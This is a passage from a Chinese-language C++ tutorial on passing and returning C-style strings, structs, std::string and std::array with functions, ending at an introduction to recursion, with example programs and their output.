char*，这可以防止意外修改，并允许函数接受字符串字面值（它们是常量）和 const 字符数组作为参数。 示例 1: 计算 C-风格字符串的长度 123456789101112131415161718192021222324#include &lt;iostream&gt;// 函数原型：计算 C 风格字符串的长度// 使用 const char* 因为我们不修改字符串unsigned int string_length(const char* str) &#123; unsigned int length = 0; // 循环直到遇到空字符 &#x27;\\0&#x27; while (*str != &#x27;\\0&#x27;) &#123; length++; str++; // 移动指针到下一个字符 &#125; return length;&#125;int main() &#123; char greeting[] = &quot;Hello&quot;; const char* message = &quot;World!&quot;; std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; greeting &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(greeting) &lt;&lt; std::endl; // 输出: 5 std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(message) &lt;&lt; std::endl; // 输出: 6 std::cout &lt;&lt; &quot;Length of \\&quot;C++\\&quot;: &quot; &lt;&lt; string_length(&quot;C++&quot;) &lt;&lt; std::endl; // 输出: 3 return 0;&#125; 示例 2: 打印 C-风格字符串 123456789101112131415161718192021#include &lt;iostream&gt;// 函数：打印 C 风格字符串void print_string(const char* str) &#123; // 可以直接使用 cout，它知道如何处理 char* 直到遇到 &#x27;\\0&#x27; std::cout &lt;&lt; str; // 或者手动遍历 // while (*str != &#x27;\\0&#x27;) &#123; // std::cout &lt;&lt; *str; // str++; // &#125;&#125;int main() &#123; char name[] = &quot;Alice&quot;; std::cout &lt;&lt; &quot;Name: &quot;; print_string(name); std::cout &lt;&lt; std::endl; return 0;&#125; 重要注意事项: 空字符终止: 处理 C-风格字符串的函数依赖于空字符 \\0 来确定结束。如果传递的字符数组没有正确地以 \\0 结尾，函数可能会读取超出数组边界的内存，导致未定义行为（通常是程序崩溃或数据损坏）。 缓冲区溢出: 如果函数需要修改传入的字符串或将数据写入字符数组缓冲区（例如 strcpy, strcat 的自定义版本），必须确保操作不会超出缓冲区的分配大小，否则会发生缓冲区溢出，这是一个严重的安全漏洞。通常需要传递缓冲区的大小作为额外参数。 const 正确性: 明确使用 const char* 来表示函数不会修改输入字符串。 7.5.2 返回 C-风格字符串的函数让函数返回一个 C-风格字符串（即 char*）比传递它要复杂得多，并且充满了潜在的陷阱。主要问题在于字符串数据存储在哪里以及其生命周期。 常见的错误方式 (危险！): 返回指向局部变量的指针: 123456// !!! 错误且危险的示例 !!!char* create_temp_string() &#123; char temp[] = &quot;Temporary&quot;; return temp; // 错误！temp 是局部数组，函数返回后内存被释放 // 返回的指针将指向无效内存 (悬挂指针)&#125; 调用 create_temp_string() 后得到的指针是无效的，解引用它会导致未定义行为。 可行的（但各有缺点）方式: 返回指向静态局部变量的指针: 12345678910111213141516171819202122#include &lt;iostream&gt;// 使用静态局部变量const char* get_static_message() &#123; static char message[] = &quot;Static Message&quot;; // message 在程序整个生命周期内存在，但只有一个实例 return message;&#125;int main() &#123; const char* msg1 = get_static_message(); std::cout &lt;&lt; &quot;Msg1: &quot; &lt;&lt; msg1 &lt;&lt; std::endl; // 输出: Static Message // 如果函数被再次调用，它会返回指向 *同一个* 静态内存的指针 // 如果函数内部修改了静态变量，所有之前的指针都会看到变化 // 这种方式不是线程安全的 const char* msg2 = get_static_message(); std::cout &lt;&lt; &quot;Msg2: &quot; &lt;&lt; msg2 &lt;&lt; std::endl; // 输出: Static Message // msg1 和 msg2 指向同一块内存 return 0;&#125; 缺点: 返回的指针指向的内存在后续调用中可能被覆盖（如果函数修改静态变量的话），并且这种方法不是线程安全的。 返回指向动态分配内存的指针 (new): 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strcpy// 返回动态分配的内存char* create_dynamic_string(const char* initial_value) &#123; char* dynamic_str = new char[strlen(initial_value) + 1]; // 分配内存 (+1 for &#x27;\\0&#x27;) strcpy(dynamic_str, initial_value); // 复制内容 return dynamic_str; // 返回指向新分配内存的指针&#125;int main() &#123; char* str1 = create_dynamic_string(&quot;Dynamic Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 1: &quot; &lt;&lt; str1 &lt;&lt; std::endl; // !!! 重要：调用者必须负责释放内存 !!! delete[] str1; str1 = nullptr; // 好习惯：释放后置空指针 char* str2 = create_dynamic_string(&quot;More Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 2: &quot; &lt;&lt; str2 &lt;&lt; std::endl; delete[] str2; str2 = nullptr; return 0;&#125; 缺点: 调用者必须记住使用 delete[] 来释放返回的指针所指向的内存，否则会导致内存泄漏。这种责任转移很容易出错。 传递由调用者分配的缓冲区 (推荐方式): 这是最安全、最常用的方法。函数接受一个指向调用者提供的缓冲区的指针和该缓冲区的大小，然后将结果字符串写入该缓冲区。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strncpy// 函数将结果写入调用者提供的缓冲区// 返回值可以指示成功/失败或写入的字符数bool format_greeting(char buffer[], size_t buffer_size, const char* name) &#123; // 使用 snprintf 或其他安全函数来防止缓冲区溢出 int written = snprintf(buffer, buffer_size, &quot;Hello, %s!&quot;, name); // 检查是否成功且未截断 (snprintf 返回值特性) if (written &gt; 0 &amp;&amp; written &lt; buffer_size) &#123; return true; // 成功 &#125; else &#123; // 可能缓冲区太小或发生错误 if (buffer_size &gt; 0) buffer[0] = &#x27;\\0&#x27;; // 确保缓冲区为空字符串 return false; // 失败 &#125;&#125;int main() &#123; const size_t BUF_SIZE = 50; char my_buffer[BUF_SIZE]; if (format_greeting(my_buffer, BUF_SIZE, &quot;Alice&quot;)) &#123; std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; // 输出: Hello, Alice! &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; &#125; if (format_greeting(my_buffer, 10, &quot;Bob The Builder&quot;)) &#123; // 尝试用小缓冲区 std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; // 这将被打印 std::cout &lt;&lt; &quot;Buffer content after fail: \\&quot;&quot; &lt;&lt; my_buffer &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出: &quot;&quot; (因为函数清空了) &#125; return 0;&#125; 优点: 内存管理由调用者负责，函数本身不分配内存，避免了内存泄漏和悬挂指针的风险。函数接口清晰地表明了其对缓冲区的需求。 总结: 将 C-风格字符串作为参数传递给函数时，传递的是 char*，函数依赖 \\0 确定结束，使用 const char* 防止意外修改。 让函数返回 C-风格字符串 (char*) 比较棘手。返回指向局部变量的指针是错误的。返回静态变量指针有局限性。返回动态分配内存 (new) 要求调用者管理内存 (delete[])。 最安全、最推荐的方式是让调用者提供缓冲区，函数将结果写入该缓冲区，并通常传递缓冲区大小以防止溢出。 在现代 C++ 中，通常更推荐使用 std::string 类来处理字符串，因为它会自动管理内存，避免了许多与 C-风格字符串相关的陷阱。 7.6 函数和结构结构 (struct) 是一种用户定义的复合类型，可以将不同类型的数据项组合成一个单一的实体。与基本数据类型一样，结构也可以作为参数传递给函数，并且函数也可以返回结构类型的值。 7.6.1 传递和返回结构默认情况下，结构与基本数据类型（如 int, double）一样，是按值传递 (Pass by Value) 给函数的。这意味着当将一个结构变量作为实参传递给函数时，函数会创建该结构的一个完整副本（形参），并在函数内部操作这个副本。对副本成员的任何修改都不会影响原始结构变量。 同样，函数也可以声明一个结构类型作为其返回类型。当函数返回一个结构时，它会创建一个该结构的临时副本，并将其返回给调用者。 示例：按值传递和返回结构 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt; // 使用 string 类成员// 定义一个简单的结构struct Point &#123; double x; double y;&#125;;// 函数原型：按值接收 Point 结构，并打印其坐标void display_point(Point p) &#123; // p 是 pt_main 的副本 std::cout &lt;&lt; &quot;Displaying Point (inside function): (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 修改副本的值，不会影响原始结构 p.x = 100.0; std::cout &lt;&lt; &quot;Modified copy inside function: (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;// 函数原型：创建一个新的 Point 结构并按值返回Point create_point(double x_val, double y_val) &#123; Point new_p; new_p.x = x_val; new_p.y = y_val; std::cout &lt;&lt; &quot;Creating Point (&quot; &lt;&lt; new_p.x &lt;&lt; &quot;, &quot; &lt;&lt; new_p.y &lt;&lt; &quot;) inside create_point.&quot; &lt;&lt; std::endl; return new_p; // 返回 Point 结构的副本&#125;int main() &#123; Point pt_main = &#123;3.0, 4.0&#125;; std::cout &lt;&lt; &quot;Before calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 按值传递 pt_main display_point(pt_main); std::cout &lt;&lt; &quot;After calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 原始结构未改变 std::cout &lt;&lt; &quot;\\nCalling create_point...&quot; &lt;&lt; std::endl; // 接收函数返回的 Point 结构副本 Point pt_returned = create_point(5.5, -1.2); std::cout &lt;&lt; &quot;Returned Point in main: (&quot; &lt;&lt; pt_returned.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_returned.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; return 0;&#125; 输出: 12345678Before calling display_point: (3, 4)Displaying Point (inside function): (3, 4)Modified copy inside function: (100, 4)After calling display_point: (3, 4)Calling create_point...Creating Point (5.5, -1.2) inside create_point.Returned Point in main: (5.5, -1.2) 按值传递的优缺点: 优点: 保护原始数据不被函数修改，概念简单。 缺点: 对于包含大量数据成员的结构，复制整个结构可能效率低下，消耗时间和内存。 7.6.2 另一个处理结构的函数示例假设我们需要一个函数来计算两个点之间的中点。 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;struct Point &#123; double x; double y;&#125;;// 函数：计算两个 Point 的中点，并返回一个新的 PointPoint find_midpoint(Point p1, Point p2) &#123; Point midpoint; midpoint.x = (p1.x + p2.x) / 2.0; midpoint.y = (p1.y + p2.y) / 2.0; return midpoint;&#125;// 辅助函数：打印 Point (按值传递)void print_point(Point p) &#123; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot;;&#125;int main() &#123; Point start_point = &#123;1.0, 1.0&#125;; Point end_point = &#123;5.0, 7.0&#125;; std::cout &lt;&lt; &quot;Start point: &quot;; print_point(start_point); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;End point: &quot;; print_point(end_point); std::cout &lt;&lt; std::endl; // 调用函数计算中点 Point mid = find_midpoint(start_point, end_point); std::cout &lt;&lt; &quot;Midpoint: &quot;; print_point(mid); // 输出: (3, 4) std::cout &lt;&lt; std::endl; return 0;&#125; 这个例子再次展示了按值传递结构（p1, p2 是副本）和按值返回结构（midpoint 的副本被返回）。 7.6.3 传递结构的地址为了避免复制整个结构的开销，特别是当结构很大时，或者当需要函数能够修改原始结构时，可以传递结构的地址（即指向结构的指针）而不是结构本身。 方法: 函数参数: 声明为指向结构类型的指针 (struct_type*)。 函数调用: 使用地址运算符 &amp; 获取结构变量的地址传递给函数。 访问成员: 在函数内部，需要使用间接成员访问运算符 -&gt; (箭头运算符) 来访问指针指向的结构的成员。或者，先解引用指针 *ptr，然后再使用点运算符 .，即 (*ptr).member。ptr-&gt;member 是 (*ptr).member 的简洁写法。 示例：按指针传递结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;struct Rectangle &#123; double width; double height;&#125;;// 函数原型：接收指向 Rectangle 的指针，计算面积// 使用 const 表示函数不会通过指针修改结构内容double calculate_area(const Rectangle* rect_ptr) &#123; // 检查空指针是一种好的防御性编程习惯 if (rect_ptr == nullptr) &#123; std::cerr &lt;&lt; &quot;Error: Null pointer passed to calculate_area.&quot; &lt;&lt; std::endl; return 0.0; &#125; // 使用箭头运算符 -&gt; 访问成员 return rect_ptr-&gt;width * rect_ptr-&gt;height; // 或者使用 (*rect_ptr).width * (*rect_ptr).height&#125;// 函数原型：接收指向 Rectangle 的指针，并修改其尺寸 (放大)void scale_rectangle(Rectangle* rect_ptr, double factor) &#123; if (rect_ptr == nullptr || factor &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Invalid arguments for scale_rectangle.&quot; &lt;&lt; std::endl; return; &#125; rect_ptr-&gt;width *= factor; // 修改原始结构 rect_ptr-&gt;height *= factor; // 修改原始结构&#125;// 辅助函数：打印 Rectangle (按指针传递，使用 const)void print_rectangle(const Rectangle* rect_ptr) &#123; if (rect_ptr == nullptr) return; std::cout &lt;&lt; &quot;Rectangle [Width=&quot; &lt;&lt; rect_ptr-&gt;width &lt;&lt; &quot;, Height=&quot; &lt;&lt; rect_ptr-&gt;height &lt;&lt; &quot;]&quot;;&#125;int main() &#123; Rectangle box = &#123;10.0, 5.0&#125;; std::cout &lt;&lt; &quot;Original Box: &quot;; print_rectangle(&amp;box); std::cout &lt;&lt; std::endl; // 传递 box 的地址给 calculate_area double area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // 输出: 50 // 传递 box 的地址给 scale_rectangle 以修改它 scale_rectangle(&amp;box, 2.0); // 放大两倍 std::cout &lt;&lt; &quot;Scaled Box: &quot;; print_rectangle(&amp;box); // 打印修改后的原始 box std::cout &lt;&lt; std::endl; // 输出: Rectangle [Width=20, Height=10] // 重新计算面积 area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // 输出: 200 return 0;&#125; 按指针传递的优缺点: 优点: 效率高，只传递地址，不复制整个结构。 允许函数修改原始结构数据。 缺点: 语法稍复杂（需要使用 &amp; 获取地址，使用 -&gt; 或 (*). 访问成员）。 可能意外修改原始数据（除非使用 const）。 需要处理空指针的可能性。 按引用传递 (Pass by Reference): C++ 还提供了另一种避免复制并允许修改原始数据的方式：按引用传递。这将在第 8 章详细介绍。按引用传递通常比按指针传递更简洁、更安全（因为它通常不涉及空引用的概念）。 123456789101112131415161718192021222324// 示例：按引用传递 (将在第 8 章详细讲解)#include &lt;iostream&gt;struct Circle &#123; double radius; &#125;;// 参数是 Circle 的引用 (别名)double circle_area_ref(const Circle&amp; c) &#123; // 使用 const 引用避免复制且不修改 return 3.14159 * c.radius * c.radius;&#125;void scale_circle_ref(Circle&amp; c, double factor) &#123; // 使用非 const 引用允许修改 if (factor &gt; 0) &#123; c.radius *= factor; // 直接用 . 访问成员，修改原始对象 &#125;&#125;int main() &#123; Circle circ = &#123;5.0&#125;; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; scale_circle_ref(circ, 3.0); std::cout &lt;&lt; &quot;New Radius: &quot; &lt;&lt; circ.radius &lt;&lt; std::endl; // 输出: 15 std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; return 0;&#125; 总结: 结构默认按值传递给函数（创建副本）。 函数可以按值返回结构（返回副本）。 为提高效率或允许修改原始结构，可以传递结构的地址（指针 struct_type*），使用 -&gt; 访问成员。 使用 const 配合指针（或引用）可以防止函数意外修改结构。 按引用传递 (struct_type&amp;) 是另一种常用的高效传递方式，通常更受欢迎。 7.7 函数和 string 对象C++ 标准库提供的 std::string 类是处理字符串的现代、更安全、更方便的方式，它与 C-风格字符串（字符数组）有很大不同。将 std::string 对象传递给函数或从函数返回它们，其行为更像结构体，但也受益于 C++ 的引用特性。 传递 std::string 对象与结构类似，std::string 对象默认也是按值传递 (Pass by Value)**。这意味着当将一个 string 对象传递给函数时，会创建该对象的一个副本**。 示例：按值传递 std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 头文件// 函数：按值接收 string 对象void display_string_value(std::string str) &#123; // str 是 message 的副本 std::cout &lt;&lt; &quot;Inside function (value): \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 修改副本，不影响原始 string str[0] = &#x27;J&#x27;; std::cout &lt;&lt; &quot;Modified copy inside function: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_value(message); std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 未改变 return 0;&#125; 输出: 1234Before call: &quot;Hello&quot;Inside function (value): &quot;Hello&quot;Modified copy inside function: &quot;Jello&quot;After call: &quot;Hello&quot; 按值传递 std::string 的问题: 虽然按值传递可以保护原始数据，但 std::string 对象可能存储很长的字符串。每次调用函数都复制整个字符串（包括其内部可能动态分配的内存）可能会导致显著的性能开销。 按引用传递 std::string为了避免复制开销并允许函数修改原始 string 对象，可以使用**按引用传递 (Pass by Reference)**。 示例：按引用传递 std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt;// 函数：按引用接收 string 对象void modify_string_ref(std::string&amp; str_ref) &#123; // str_ref 是 message 的别名 std::cout &lt;&lt; &quot;Inside function (reference): \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 修改引用，会直接修改原始 string str_ref += &quot; World&quot;; std::cout &lt;&lt; &quot;Modified original via reference: \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; modify_string_ref(message); // 传递引用 std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 已被修改 return 0;&#125; 输出: 1234Before call: &quot;Hello&quot;Inside function (reference): &quot;Hello&quot;Modified original via reference: &quot;Hello World&quot;After call: &quot;Hello World&quot; 按常量引用传递 std::string (推荐方式)如果函数需要读取 string 的内容但不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了按引用传递的效率（避免复制），同时具有按值传递的安全性（防止函数修改原始数据）。 示例：按常量引用传递 std::string 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;// 函数：按常量引用接收 string 对象void display_string_const_ref(const std::string&amp; str_cref) &#123; // str_cref 是 message 的常量别名 std::cout &lt;&lt; &quot;Inside function (const reference): \\&quot;&quot; &lt;&lt; str_cref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // str_cref[0] = &#x27;J&#x27;; // 错误！不能通过常量引用修改对象 std::cout &lt;&lt; &quot;String length: &quot; &lt;&lt; str_cref.length() &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello C++&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_const_ref(message); // 传递常量引用 std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 未改变 // 也可以传递字符串字面值，它们会自动转换为临时的 string 对象 display_string_const_ref(&quot;Temporary String&quot;); return 0;&#125; 输出: 123456Before call: &quot;Hello C++&quot;Inside function (const reference): &quot;Hello C++&quot;String length: 9After call: &quot;Hello C++&quot;Inside function (const reference): &quot;Temporary String&quot;String length: 16 总结传递方式: 按值 (std::string str): 创建副本，安全但可能低效。 按引用 (std::string&amp; str): 不创建副本，高效，允许修改原始对象。 按常量引用 (const std::string&amp; str): 不创建副本，高效，不允许修改原始对象。这是将字符串传递给函数进行只读访问的最常用和推荐的方式。 返回 std::string 对象函数也可以返回 std::string 对象。通常直接按值返回即可。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;// 函数：创建一个问候语字符串并返回std::string create_greeting(const std::string&amp; name) &#123; std::string result = &quot;Hello, &quot; + name + &quot;!&quot;; return result; // 返回 string 对象&#125;int main() &#123; std::string user_name = &quot;Alice&quot;; std::string greeting = create_greeting(user_name); std::cout &lt;&lt; greeting &lt;&lt; std::endl; // 输出: Hello, Alice! return 0;&#125; 虽然看起来这里也涉及复制（返回 result 的副本），但现代 C++ 编译器通常会应用返回值优化 (RVO) 或**命名返回值优化 (NRVO)**。这些优化可以避免在返回 string（或其他对象）时进行实际的复制，使得按值返回 std::string 非常高效。 与 C-风格字符串的比较: 使用 std::string 对象与函数交互比使用 C-风格字符串 (char*) 简单得多： 不需要担心空字符 \\0。 不需要手动管理内存（new/delete[]）。 不需要单独传递大小（string 对象知道自己的大小）。 按引用（尤其是常量引用）传递避免了复制开销，同时保持了代码的清晰和安全。 返回值优化使得按值返回 string 通常很高效。 因此，在现代 C++ 中，强烈推荐使用 std::string 而不是 C-风格字符串来处理文本数据。 7.8 函数与 array 对象C++11 引入了 std::array 模板类（在 &lt;array&gt; 头文件中定义），它提供了一种更安全、更方便的方式来表示固定大小的数组。与 C 风格数组会“退化”成指针不同，std::array 对象表现得更像普通的类对象（类似于结构体）。 关键特性: std::array 封装了一个固定大小的 C 风格数组。 其大小是类型信息的一部分（例如 std::array&lt;int, 5&gt; 和 std::array&lt;int, 10&gt; 是不同的类型）。 它提供了成员函数（如 size(), at(), front(), back()）和对迭代器的支持。 它不会自动退化为指针。 传递 std::array 对象由于 std::array 表现得像一个对象，它默认是按值传递 (Pass by Value) 给函数的。这意味着当将一个 array 对象传递给函数时，会创建该对象的完整副本。 示例：按值传递 std::array 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;array&gt; // 包含 array 头文件#include &lt;numeric&gt; // 为了 std::accumulate// 定义一个包含 5 个 double 的 array 类型别名using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按值接收 array 对象，计算总和// arr 是 data 的副本double sum_array_value(FiveDoubles arr) &#123; std::cout &lt;&lt; &quot;Inside function (value): Modifying copy...&quot; &lt;&lt; std::endl; arr[0] = 1000.0; // 修改副本，不影响原始 array double sum = 0.0; for (double x : arr) &#123; sum += x; &#125; // 或者使用 std::accumulate(arr.begin(), arr.end(), 0.0); return sum;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; std::cout &lt;&lt; &quot;Before call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; double total = sum_array_value(data); std::cout &lt;&lt; &quot;After call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 原始 array 未改变 std::cout &lt;&lt; &quot;Sum calculated by value: &quot; &lt;&lt; total &lt;&lt; std::endl; return 0;&#125; 输出: 1234Before call, data[0] &#x3D; 1.1Inside function (value): Modifying copy...After call, data[0] &#x3D; 1.1Sum calculated by value: 1015.4 按值传递 std::array 的问题: 与 std::string 和大型结构体类似，如果 std::array 很大，按值传递会复制整个数组内容，导致性能开销。 按引用传递 std::array为了避免复制开销并允许函数修改原始 array 对象，可以使用**按引用传递 (Pass by Reference)**。 示例：按引用传递 std::array 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按引用接收 array 对象，并将所有元素乘以因子// arr_ref 是 data 的别名void scale_array_ref(FiveDoubles&amp; arr_ref, double factor) &#123; std::cout &lt;&lt; &quot;Inside function (reference): Scaling original array...&quot; &lt;&lt; std::endl; for (double&amp; x : arr_ref) &#123; // 使用引用访问元素以修改它们 x *= factor; &#125;&#125;int main() &#123; FiveDoubles data = &#123;1.0, 2.0, 3.0, 4.0, 5.0&#125;; std::cout &lt;&lt; &quot;Before call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; scale_array_ref(data, 10.0); // 传递引用 std::cout &lt;&lt; &quot;After call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 原始 array 已被修改 std::cout &lt;&lt; std::endl; return 0;&#125; 输出: 123Before call: 1 2 3 4 5Inside function (reference): Scaling original array...After call: 10 20 30 40 50 按常量引用传递 std::array (推荐方式)如果函数只需要读取 array 的内容而不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了效率（避免复制）和安全性（防止修改）。 示例：按常量引用传递 std::array 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按常量引用接收 array 对象，并打印它// arr_cref 是 data 的常量别名void print_array_const_ref(const FiveDoubles&amp; arr_cref) &#123; std::cout &lt;&lt; &quot;Inside function (const reference): Array elements are: &quot;; // arr_cref[0] = 0.0; // 错误！不能通过常量引用修改 for (double x : arr_cref) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; &quot;(Size: &quot; &lt;&lt; arr_cref.size() &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; print_array_const_ref(data); // 传递常量引用 // 原始 array 未改变 std::cout &lt;&lt; &quot;Back in main, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; return 0;&#125; 输出: 12Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)Back in main, data[0] &#x3D; 1.1 总结传递方式: 按值 (std::array&lt;T, N&gt; arr): 创建副本，安全但可能低效。 按引用 (std::array&lt;T, N&gt;&amp; arr): 不创建副本，高效，允许修改。 按常量引用 (const std::array&lt;T, N&gt;&amp; arr): 不创建副本，高效，不允许修改。这是将 array 传递给函数进行只读访问的最常用和推荐的方式。 返回 std::array 对象函数也可以返回 std::array 对象，通常按值返回。与 std::string 类似，编译器通常会应用 RVO/NRVO 来优化掉返回时的复制操作。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;cmath&gt; // for std::powusing ThreeInts = std::array&lt;int, 3&gt;;// 函数：创建一个包含 x, x^2, x^3 的 array 并返回ThreeInts create_powers(int x) &#123; ThreeInts result; result[0] = x; result[1] = static_cast&lt;int&gt;(std::pow(x, 2)); result[2] = static_cast&lt;int&gt;(std::pow(x, 3)); return result; // 返回 array 对象 (通常会被优化)&#125;int main() &#123; ThreeInts powers_of_5 = create_powers(5); std::cout &lt;&lt; &quot;Powers of 5: &quot;; for (int val : powers_of_5) &#123; std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; // 输出: 5 25 125 &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 与 C 风格数组的比较: 使用 std::array 与函数交互比使用 C 风格数组更优越： 大小是类型的一部分: 函数签名明确指定了期望的数组大小，提高了类型安全。例如，不能将 std::array&lt;int, 5&gt; 传递给期望 std::array&lt;int, 10&gt; 的函数。 无指针退化: std::array 不会退化为指针，避免了相关的混淆和错误。 传递方式明确: 像普通对象一样按值、按引用或按常量引用传递，语义清晰。 接口更丰富: 可以直接在函数内部使用 size(), at() 等成员函数。 因此，在需要固定大小数组的场景下，std::array 通常是比 C 风格数组更好的选择，尤其是在函数参数和返回值中使用时。 7.9 递归递归 (Recursion) 是一种编程技巧，其中函数直接或间接地调用自身来解决问题。递归函数将一个大问题分解为一个或多个与原问题相似但规模更小的子问题，直到问题规模小到可以直接解决（称为基线条件或基本情况）。 递归函数通常包含两个关键部分： 基线条件 (Base Case): 一个或多个停止递归的条件。当满足基线条件时，函数不再调用自身，而是返回一个确定的值或执行一个简单的操作。没有基线条件会导致无限递归，最终耗尽内存（栈溢出）。 递归步骤 (Recursive Step): 函数调用自身，但通常使用修改后的参数，使得问题规模向基线条件靠近。 7.9.1 包含一个递归调用的递归这是最简单的递归形式，函数在每次执行时最多调用自身一次。 示例：使用递归进行倒计时 123456789101112131415161718#include &lt;iostream&gt;// 递归函数：从 n 倒数到 1void countdown(int n) &#123; // 基线条件：当 n 小于等于 0 时，停止递归 if (n &lt;= 0) &#123; std::cout &lt;&lt; &quot;Blastoff!&quot; &lt;&lt; std::endl; &#125; else &#123; // 递归步骤：打印当前数字，然后调用自身处理 n-1 std::cout &lt;&lt; n &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; countdown(n - 1); // 函数调用自身，问题规模减小 (n -&gt; n-1) &#125;&#125;int main() &#123; countdown(5); return 0;&#125; 输出: 1234565...4...3...2...1...Blastoff! 工作原理 (调用栈): main 调用 countdown(5)。 countdown(5) 打印 “5…”，然后调用 countdown(4)。 countdown(4) 打印 “4…”，然后调用 countdown(3)。 … 这个过程继续 … countdown(1) 打印 “1…”，然后调用 countdown(0)。 countdown(0) 满足基线条件 (n &lt;= 0)，打印 “Blastoff!” 并返回。 countdown(1) 返回。 countdown(2) 返回。 … 依次回溯 … countdown(5) 返回到 main。 